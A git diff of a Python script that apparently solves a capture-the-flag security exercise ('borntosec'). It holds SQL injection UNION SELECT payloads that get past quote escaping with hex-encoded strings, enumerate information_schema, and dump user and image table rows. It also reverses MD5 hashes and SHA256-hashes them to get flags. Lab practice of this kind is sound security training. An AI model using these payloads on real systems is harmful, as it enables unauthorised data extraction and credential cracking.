@@ -30,16 +30,16 @@ query = f"1 UNION SELECT NULL, GROUP_CONCAT(0x7c,schema_name,0x7c) FROM informat
 """
 
 """
-# STEP 2: GET THE TABLE NAMES FOR THE SCHEMA Member_Sql_Injection
-# result: |users|
-schema = to_hex("Member_Sql_Injection")
+# STEP 2: GET THE TABLE NAMES FOR THE SCHEMA Member_images
+# result: | |list_images||
+schema = to_hex("Member_images")
 query = f"1 UNION SELECT NULL, GROUP_CONCAT(0x7c,table_name,0x7c) FROM information_schema.tables WHERE table_schema={schema}"
 """
 
 """
-# STEP 3: GET THE COLUMN NAMES FOR THE TABLE users
-# result: |user_id|,|first_name|,|last_name|,|town|,|country|,|planet|,|Commentaire|,|countersign|
-table = to_hex("users")
+# STEP 3: GET THE COLUMN NAMES FOR THE TABLE list_images
+# result: | |id|,|url|,|title|,|comment||
+table = to_hex("list_images")
 query = f"1 UNION SELECT NULL, GROUP_CONCAT(0x7c,column_name,0x7c) FROM information_schema.columns WHERE table_name={table}"
 """
 
@@ -60,25 +60,15 @@ query = (
         + to_hex(")")
         + ") FROM Member_Sql_Injection.users"
 )
-# result: ("user_id: 1","first_name: one","last_name: me","town: Paris ","country: France","planet: EARTH","Commentaire: Je pense, donc je suis","countersign: 2b3366bcfd44f540e630d4dc2b9b06d9"),("user_id: 2","first_name: two","last_name: me","town: Helsinki","country: Finlande","planet: Earth","Commentaire: Aamu on iltaa viisaampi.","countersign: 60e9032c586fb422e2c16dee6286cf10"),("user_id: 3","first_name: three","last_name: me","town: Dublin","country: Irlande","planet: Earth","Commentaire: Dublin is a city of stories and secrets.","countersign: e083b24a01c483437bcf4a9eea7c1b4d"),("user_id: 5","first_name: Flag","last_name: GetThe","town: 42","country: 42","planet: 42","Commentaire: Decrypt this password -> then lower all the char. Sh256 on it and it's good !","countersign: 5ff9d0165b4f92b14994e5c685cdce28")
-query_result = [
-    ("user_id: 1", "first_name: one", "last_name: me", "town: Paris ", "country: France", "planet: EARTH",
-     "Commentaire: Je pense, donc je suis", "countersign: 2b3366bcfd44f540e630d4dc2b9b06d9"),
-    ("user_id: 2", "first_name: two", "last_name: me", "town: Helsinki", "country: Finlande", "planet: Earth",
-     "Commentaire: Aamu on iltaa viisaampi.", "countersign: 60e9032c586fb422e2c16dee6286cf10"),
-    ("user_id: 3", "first_name: three", "last_name: me", "town: Dublin", "country: Irlande", "planet: Earth",
-     "Commentaire: Dublin is a city of stories and secrets.", "countersign: e083b24a01c483437bcf4a9eea7c1b4d"),
-    ("user_id: 5", "first_name: Flag", "last_name: GetThe", "town: 42", "country: 42", "planet: 42",
-     "Commentaire: Decrypt this password -> then lower all the char. Sh256 on it and it's good !",
-     "countersign: 5ff9d0165b4f92b14994e5c685cdce28")
+# result: ("id: 1","url: https://fr.wikipedia.org/wiki/Programme_","title: Nsa","comment: An image about the NSA !"),("id: 2","url: https://fr.wikipedia.org/wiki/Fichier:42","title: 42 !","comment: There is a number.."),("id: 3","url: https://fr.wikipedia.org/wiki/Logo_de_Go","title: Google","comment: Google it !"),("id: 4","url: https://en.wikipedia.org/wiki/Earth#/med","title: Earth","comment: Earth!"),("id: 5","url: borntosec.ddns.net/images.png","title: Hack me ?","comment: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46")query_result = [
+   ("id: 1","url: https://fr.wikipedia.org/wiki/Programme_","title: Nsa","comment: An image about the NSA !"),
+   ("id: 2","url: https://fr.wikipedia.org/wiki/Fichier:42","title: 42 !","comment: There is a number.."),
+   ("id: 3","url: https://fr.wikipedia.org/wiki/Logo_de_Go","title: Google","comment: Google it !"),
+   ("id: 4","url: https://en.wikipedia.org/wiki/Earth#/med","title: Earth","comment: Earth!"),
+   ("id: 5","url: borntosec.ddns.net/images.png","title: Hack me ?","comment: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46")
 ]
 """
 
-"""
-# LAST STEP?: DECRYPT THE COUNTERSIGN, lowercase it and ENCRYPT IT WITH SHA256 TO GET THE PASSWORD
-# COUNTERSIGN OF LAST ELEMENT: MD5: 5ff9d0165b4f92b14994e5c685cdce28 -> FortyTwo
-# fortytwo encrypted SHA256 -> 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
-"""
 # -----------------------------------------------------------------------------------------------------------------------
 
 schema = to_hex("Member_images")
@@ -87,6 +77,8 @@ table = to_hex("list_images")
 # TODO: CHANGE THIS QUERY FOR YOUR NEEDS
 # The quotes are escaped by the backend, so to use a string as a value, we need to convert it to a hexadecimal value with the to_hex function.
 dquote = to_hex('"')
+
+table = to_hex("list_images")
 query = (
         "1 UNION SELECT NULL, GROUP_CONCAT("
         + to_hex("(") + ","
@@ -164,11 +156,11 @@ else:
         for j in SHOW_N_COLUMNS:
             print(f"{item[j]}")
 
-countersign = last_result[-1]
-# COUNTERSIGN OF LAST ELEMENT: 1928e8083cf461a51303633093573c46 -> albatroz (https://md5.gromweb.com/?md5=1928e8083cf461a51303633093573c46)
-decrypted_countersign = "albatroz"
 
-lowered_countersign = decrypted_countersign.lower()
+# 1928e8083cf461a51303633093573c46 -> albatroz (https://md5.gromweb.com/?md5=1928e8083cf461a51303633093573c46)
+decryped_md5 = "albatroz"
+
+lowered_countersign = decryped_md5.lower()
 sha256_hash = hashlib.sha256(lowered_countersign.encode()).hexdigest()
 
-print(f"[sha256_hash] RESULT: {sha256_hash}")
+print(f"sha256_hash of decrypted(lowered) {decryped_md5=} RESULT: {sha256_hash}")
